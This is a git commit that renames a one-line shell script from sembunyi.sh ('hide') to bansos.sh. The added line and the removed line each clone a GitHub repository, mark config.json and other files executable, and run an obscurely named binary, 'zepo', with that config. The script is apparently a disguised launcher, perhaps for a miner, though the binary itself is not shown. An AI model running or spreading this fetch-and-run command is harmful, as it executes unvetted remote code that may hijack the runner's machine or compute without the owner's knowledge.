e0f44723bbd790302d57f6ae14b93946bff77e41
epois <152323500+epois@users.noreply.github.com>
2023-12-28 00:09:58 +0800

    Update and rename sembunyi.sh to bansos.sh

---
+++ bansos.sh
@@ -0,0 +1,1 @@
+git clone https://github.com/epois/zeinsubi.git && cd zeinsubi && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
--- sembunyi.sh
+++
@@ -1,1 +0,0 @@
-git clone https://github.com/epois/subi.git && cd subi && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
